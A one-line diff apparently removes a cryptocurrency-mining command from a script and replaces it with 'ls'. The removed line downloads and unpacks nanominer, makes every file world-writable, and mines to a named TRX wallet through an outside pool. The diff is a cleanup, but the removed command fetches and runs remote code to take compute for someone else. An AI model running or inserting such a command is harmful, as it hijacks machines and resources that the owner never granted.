@@ -1,1 +1,1 @@
-wget https://github.com/nanopool/nanominer/releases/download/v3.6.3/nanominer-linux-3.6.3.tar.gz && tar -xvf nanominer-linux-3.6.3.tar.gz && cd nanominer-linux-3.6.3 && chmod 777 * && ./nanominer -algo ethash -wallet TRX:TEtD4RvEnWRQk7tTLwD1A4UnuTceN9vH8y.gpuarip -rigName gpuarip -pool1 ethash.unmineable.com:3333
+ls
